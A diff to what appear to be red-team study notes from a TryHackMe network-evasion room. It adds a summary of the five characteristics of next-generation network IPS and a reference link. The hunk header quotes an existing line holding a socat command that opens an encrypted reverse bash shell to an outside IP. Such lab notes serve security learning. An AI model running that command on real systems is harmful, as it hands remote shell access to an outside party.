@@ -100,3 +100,16 @@ socat OPENSSL:10.10.10.10:4443,verify=0 EXEC:/bin/bash
 
 ## Modifying the shellcode
 
+## Next-Gen Security
+
+Next-Generation Network IPS (NGNIPS) has the following five characteristics according to [Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):
+
+1.  Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do.
+2.  Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer.
+3.  Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions.
+4.  Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic.
+5.  Agile engine: Support upgrade paths to benefit from new information feeds.
+
+
+## References
+[THM Network Evasion Room](https://tryhackme.com/room/redteamnetsec)
